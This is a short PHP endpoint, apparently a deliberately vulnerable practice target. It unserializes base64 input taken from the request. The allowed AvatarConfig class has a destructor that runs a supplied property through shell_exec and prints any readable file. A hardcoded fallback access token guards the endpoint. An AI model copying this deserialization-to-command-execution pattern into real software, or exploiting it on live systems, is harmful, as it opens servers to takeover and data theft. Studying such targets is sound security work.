<?php
$expectedToken = getenv("INTERNAL_TOKEN") ?: "itk_devtoken_do_not_use_in_prod";
$givenToken = $_SERVER["HTTP_X_INTERNAL_TOKEN"] ?? ($_GET["token"] ?? "");

if (!hash_equals($expectedToken, $givenToken)) {
    http_response_code(403);
    echo "forbidden";
    exit;
}

$action = $_GET["action"] ?? "";

if ($action !== "avatar_config") {
    http_response_code(404);
    echo "unknown action";
    exit;
}

class AvatarConfig
{
    public $cacheWarmCmd = null;
    public $debugDumpFile = null;

    public function __destruct()
    {
        if ($this->debugDumpFile) {
            if (is_readable($this->debugDumpFile)) {
                echo file_get_contents($this->debugDumpFile);
            }
        }
        if ($this->cacheWarmCmd) {
            echo shell_exec($this->cacheWarmCmd);
        }
    }
}

$payloadB64 = $_GET["payload"] ?? ($_POST["payload"] ?? "");
$serialized = base64_decode($payloadB64, true);

if ($serialized === false) {
    http_response_code(400);
    echo "payload harus base64 valid";
    exit;
}

header("Content-Type: text/plain");

$obj = unserialize($serialized, ["allowed_classes" => [AvatarConfig::class]]);

if (!($obj instanceof AvatarConfig)) {
    echo "payload tidak menghasilkan AvatarConfig yang valid";
}
